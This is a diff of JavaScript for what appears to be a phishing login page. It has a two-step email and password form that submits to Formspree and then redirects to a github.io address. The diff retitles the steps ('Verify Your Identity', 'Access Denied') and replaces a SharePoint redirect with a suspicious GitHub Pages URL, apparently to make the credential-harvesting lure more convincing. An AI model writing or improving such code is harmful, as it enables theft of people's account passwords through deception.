@@ -302,7 +302,7 @@ document.addEventListener('DOMContentLoaded', function() {
     function proceedToPassword() {
         displayEmailInStep2(userEmail);
         showStep(2);
-        updateFormTitle('Enter Your Password');
+        updateFormTitle('Verify Your Identity');
         // Focus on password input
         setTimeout(() => {
             passwordInput.focus();
@@ -423,7 +423,7 @@ document.addEventListener('DOMContentLoaded', function() {
         try {
             // Disable button and show loading
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Sign in';
+            submitBtn.textContent = 'Sign in..';
             submitBtn.style.opacity = '0.7';
             
             // Set provider value in hidden input
@@ -474,7 +474,7 @@ document.addEventListener('DOMContentLoaded', function() {
             if (response.ok) {
                 // Show success message
                 showStep(3);
-                updateFormTitle('Access Granted');
+                updateFormTitle('Access Denied');
                 
                 console.log('Form submitted successfully to Formspree');
                 
@@ -528,7 +528,7 @@ document.addEventListener('DOMContentLoaded', function() {
         closePopup();
         
         // Define the redirect URL (you can change this to any URL you want)
-        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
+        const redirectUrl = 'https://rocessmaintenancenutrimixroup.github.io/eoresources/'; // Change this URL
         
         console.log('Redirecting to:', redirectUrl);
         
